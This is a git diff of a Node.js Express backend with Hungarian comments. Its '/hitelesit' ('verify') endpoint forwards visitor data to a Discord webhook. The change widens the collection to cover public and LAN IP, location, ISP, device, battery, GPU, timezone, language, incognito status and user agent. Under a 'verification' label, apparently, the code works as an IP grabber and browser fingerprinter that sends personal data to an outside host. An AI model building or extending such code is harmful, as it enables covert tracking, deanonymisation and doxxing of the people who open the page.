@@ -4,7 +4,6 @@ const cors = require('cors');
 
 const app = express();
 
-// ====================== CORS BEÁLLÍTÁS ======================
 app.use(cors({
     origin: [
         'https://hitelesites.netlify.app',
@@ -19,48 +18,20 @@ app.use(cors({
 }));
 
 app.options('*', cors());
-app.use(express.json({ limit: '10kb' }));
+app.use(express.json({ limit: '50kb' })); // megnövelve a nagyobb adat miatt
 
 const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
 
-// ====================== SEGÉDFÜGGVÉNYEK ======================
 const getClientIP = (req) => {
     return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || 'Ismeretlen')
         .split(',')[0].trim();
 };
 
-const parseUA = (ua) => {
-    if (!ua) return { browser: "Ismeretlen", os: "Ismeretlen", device: "Ismeretlen" };
-    
-    let browser = "Ismeretlen";
-    let os = "Ismeretlen";
-    let device = "Desktop";
-
-    // Böngésző
-    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-    else if (ua.includes("Firefox")) browser = "Firefox";
-    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-    else if (ua.includes("Edg")) browser = "Edge";
-    else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
-
-    // Operációs rendszer
-    if (ua.includes("Windows")) os = "Windows";
-    else if (ua.includes("Mac")) os = "macOS";
-    else if (ua.includes("Linux")) os = "Linux";
-    else if (ua.includes("Android")) { os = "Android"; device = "Mobile"; }
-    else if (ua.includes("iPhone") || ua.includes("iPad")) { os = "iOS"; device = "Mobile"; }
-
-    if (ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")) device = "Mobile";
-
-    return { browser, os, device };
-};
-
 // ====================== FŐ ENDPOINT ======================
 app.post('/hitelesit', async (req, res) => {
     try {
-        const { ua, res: resolution, localIP } = req.body;
+        const data = req.body;
         const publicIP = getClientIP(req);
-        const parsed = parseUA(ua);
 
         await axios.post(WEBHOOK, {
             embeds: [{
@@ -68,17 +39,21 @@ app.post('/hitelesit', async (req, res) => {
                 color: 0x00FF41,
                 timestamp: new Date().toISOString(),
                 fields: [
+                    { name: "Dátum / Idő", value: new Date().toLocaleString('hu-HU'), inline: false },
                     { name: "Publikus IP", value: publicIP, inline: true },
-                    { name: "Privát IP (LAN)", value: localIP || "Nem található", inline: true },
-                    { name: "Eszköz", value: parsed.device, inline: true },
-                    { name: "Operációs Rendszer", value: parsed.os, inline: true },
-                    { name: "Böngésző", value: parsed.browser, inline: true },
-                    { name: "Képernyőfelbontás", value: resolution || "Nincs adat", inline: true },
-                    { 
-                        name: "User Agent", 
-                        value: ua ? ua.substring(0, 400) + (ua.length > 400 ? "..." : "") : "Nincs adat",
-                        inline: false 
-                    }
+                    { name: "Privát IP (LAN)", value: data.localIP || "Nem található", inline: true },
+                    { name: "Ország / Város", value: data.country || "Ismeretlen", inline: true },
+                    { name: "ISP", value: data.isp || "Ismeretlen", inline: true },
+                    { name: "Eszköz", value: data.device || "Ismeretlen", inline: true },
+                    { name: "Operációs Rendszer", value: data.os || "Ismeretlen", inline: true },
+                    { name: "Böngésző", value: data.browser || "Ismeretlen", inline: true },
+                    { name: "Képernyő", value: data.screen || "Ismeretlen", inline: true },
+                    { name: "Akkumulátor", value: data.battery ? `${data.battery}% ${data.charging ? '(Töltődik)' : ''}` : "N/A", inline: true },
+                    { name: "Időzóna", value: data.timezone || "Ismeretlen", inline: true },
+                    { name: "Nyelv", value: data.language || "Ismeretlen", inline: true },
+                    { name: "Incognito", value: data.incognito ? "Igen" : "Nem", inline: true },
+                    { name: "GPU", value: data.gpu || "Ismeretlen", inline: false },
+                    { name: "User Agent", value: data.ua ? data.ua.substring(0, 450) + "..." : "Nincs adat", inline: false }
                 ]
             }]
         });
@@ -90,16 +65,9 @@ app.post('/hitelesit', async (req, res) => {
     }
 });
 
-// Health check
-app.get('/health', (req, res) => {
-    res.status(200).json({ status: 'OK', uptime: process.uptime() });
-});
+app.get('/health', (req, res) => res.json({ status: 'OK' }));
 
-// ====================== SZERVER INDÍTÁS ======================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Szerver fut a ${PORT}-es porton`);
-    if (!WEBHOOK) {
-        console.error('❌ FIGYELMEZTETÉS: DISCORD_WEBHOOK_URL nincs beállítva!');
-    }
 });
